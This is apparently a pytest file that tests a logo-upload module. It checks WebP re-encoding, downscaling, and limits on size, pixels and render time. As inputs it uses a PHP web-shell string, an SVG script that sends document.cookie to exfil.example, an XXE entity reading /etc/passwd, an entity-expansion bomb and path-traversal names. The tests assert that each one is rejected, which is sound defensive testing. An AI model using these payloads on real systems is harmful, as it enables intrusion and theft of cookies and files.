"""Tests for logo storage.

The point of these is the guarantee the module is built on: whatever is
uploaded, what ends up on disk is an image we generated ourselves. Several
tests therefore assert on the absence of the original payload rather than on
the happy path only.
"""

from io import BytesIO
from pathlib import Path

import pytest
from PIL import Image

from backend.config import Config
from backend.helpers import logo_storage
from backend.helpers.logo_storage import (
    LogoError,
    delete_logo,
    logo_path,
    save_logo,
)

SVG = (
    b'<?xml version="1.0" encoding="UTF-8"?>'
    b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 80"'
    b' width="200" height="80">'
    b'<rect width="200" height="80" fill="#0a7"/></svg>'
)


@pytest.fixture(autouse=True)
def logo_dir(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    monkeypatch.setattr(Config, "LOGO_DIR", str(tmp_path), raising=False)
    monkeypatch.setattr(Config, "LOGO_MAX_UPLOAD_BYTES", 2 * 1024 * 1024, raising=False)
    monkeypatch.setattr(Config, "LOGO_MAX_DIMENSION", 256, raising=False)
    monkeypatch.setattr(Config, "LOGO_SVG_TIMEOUT_SEC", 20.0, raising=False)
    return tmp_path


def _png(width: int = 800, height: int = 600, mode: str = "RGB") -> bytes:
    buffer = BytesIO()
    Image.new(mode, (width, height), (200, 30, 40)).save(buffer, format="PNG")
    return buffer.getvalue()


def _stored(name: str) -> bytes:
    path = logo_path(name)
    assert path is not None
    return Path(path).read_bytes()


def test_stores_a_webp_under_a_random_name() -> None:
    name = save_logo(_png())

    assert name.endswith(".webp")
    assert len(name) == len("0123456789abcdef0123456789abcdef") + len(".webp")
    with Image.open(BytesIO(_stored(name))) as image:
        assert image.format == "WEBP"


def test_downscales_to_the_configured_maximum() -> None:
    name = save_logo(_png(2000, 1500))

    with Image.open(BytesIO(_stored(name))) as image:
        assert max(image.size) <= Config.LOGO_MAX_DIMENSION


def test_keeps_transparency() -> None:
    buffer = BytesIO()
    image = Image.new("RGBA", (120, 120), (0, 0, 0, 0))
    for x in range(60):
        for y in range(60):
            image.putpixel((x, y), (10, 200, 90, 255))
    image.save(buffer, format="PNG")

    name = save_logo(buffer.getvalue())

    with Image.open(BytesIO(_stored(name))) as stored:
        rgba = stored.convert("RGBA")
        opaque_corner = rgba.getpixel((5, 5))
        clear_corner = rgba.getpixel((rgba.width - 5, rgba.height - 5))
        assert isinstance(opaque_corner, tuple)
        assert isinstance(clear_corner, tuple)
        assert opaque_corner[3] > 200
        assert clear_corner[3] < 60


def test_re_encoding_drops_trailing_payload() -> None:
    """A valid image with a payload appended is the classic polyglot upload."""
    name = save_logo(_png(50, 50) + b"<?php system($_GET[0]); ?>")

    assert b"<?php" not in _stored(name)


@pytest.mark.parametrize(
    "payload",
    [
        pytest.param(b"", id="empty"),
        pytest.param(b"<?php system($_GET[0]); ?>" * 10, id="not-an-image"),
        pytest.param(_png()[:80], id="truncated"),
    ],
)
def test_rejects_unusable_uploads(payload: bytes) -> None:
    with pytest.raises(LogoError):
        save_logo(payload)


def test_rejects_uploads_over_the_size_limit() -> None:
    with pytest.raises(LogoError):
        save_logo(b"x" * (Config.LOGO_MAX_UPLOAD_BYTES + 1))


def test_rejects_a_decompression_bomb(monkeypatch: pytest.MonkeyPatch) -> None:
    """A small file can still decode to a huge image.

    The byte cap says nothing about the decoded size, and Pillow raises
    DecompressionBombError, which is not an OSError: unhandled it would come
    back as a 500 rather than a rejected upload.
    """
    monkeypatch.setattr(logo_storage, "MAX_IMAGE_PIXELS", 4096, raising=False)

    # Comfortably over the patched limit, but a tiny file: a single-colour PNG
    # compresses to almost nothing.
    payload = _png(4000, 4000)
    assert len(payload) < Config.LOGO_MAX_UPLOAD_BYTES

    with pytest.raises(LogoError, match="too many pixels"):
        save_logo(payload)


def test_pixel_limit_is_restored_after_use(monkeypatch: pytest.MonkeyPatch) -> None:
    """The cap is global to Pillow, so it must not leak out of save_logo."""
    monkeypatch.setattr(logo_storage, "MAX_IMAGE_PIXELS", 4096, raising=False)
    before = Image.MAX_IMAGE_PIXELS

    with pytest.raises(LogoError):
        save_logo(_png(4000, 4000))

    assert Image.MAX_IMAGE_PIXELS == before


def test_refuses_a_format_outside_the_allow_list() -> None:
    """`formats=` makes Pillow refuse at open time rather than after decoding."""
    buffer = BytesIO()
    Image.new("RGB", (10, 10), (1, 2, 3)).save(buffer, format="PPM")

    with pytest.raises(LogoError):
        save_logo(buffer.getvalue())


def test_renders_svg_and_stores_it_as_webp() -> None:
    name = save_logo(SVG)

    stored = _stored(name)
    assert b"<svg" not in stored
    with Image.open(BytesIO(stored)) as image:
        assert image.format == "WEBP"


def test_svg_scripting_does_not_survive() -> None:
    hostile = (
        b'<svg xmlns="http://www.w3.org/2000/svg" width="80" height="80">'
        b'<script>fetch("https://exfil.example/"+document.cookie)</script>'
        b'<rect width="80" height="80" fill="#c00" onload="alert(1)"/></svg>'
    )

    stored = _stored(save_logo(hostile)).lower()

    assert b"script" not in stored
    assert b"onload" not in stored
    assert b"exfil.example" not in stored


@pytest.mark.parametrize(
    "payload",
    [
        pytest.param(
            b'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "aaaaaaaaaa">'
            b'<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">]>'
            b'<svg xmlns="http://www.w3.org/2000/svg"><text>&b;</text></svg>',
            id="expansion-bomb",
        ),
        pytest.param(
            b'<?xml version="1.0"?>'
            b'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            b'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
            id="external-entity",
        ),
    ],
)
def test_rejects_svg_declaring_entities(payload: bytes) -> None:
    with pytest.raises(LogoError):
        save_logo(payload)


def test_gives_up_on_an_svg_that_takes_too_long(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Render time is unrelated to file size, so the timeout is the real guard."""
    monkeypatch.setattr(Config, "LOGO_SVG_TIMEOUT_SEC", 0.01, raising=False)

    with pytest.raises(LogoError, match="longer than"):
        save_logo(SVG)


@pytest.mark.parametrize(
    "name",
    ["../../etc/passwd", "..\\windows\\system32", "sub/dir.webp", ""],
)
def test_logo_path_refuses_traversal(name: str) -> None:
    assert logo_path(name) is None


def test_delete_is_idempotent() -> None:
    name = save_logo(_png(40, 40))

    delete_logo(name)
    delete_logo(name)
    delete_logo(None)

    assert logo_path(name) is None
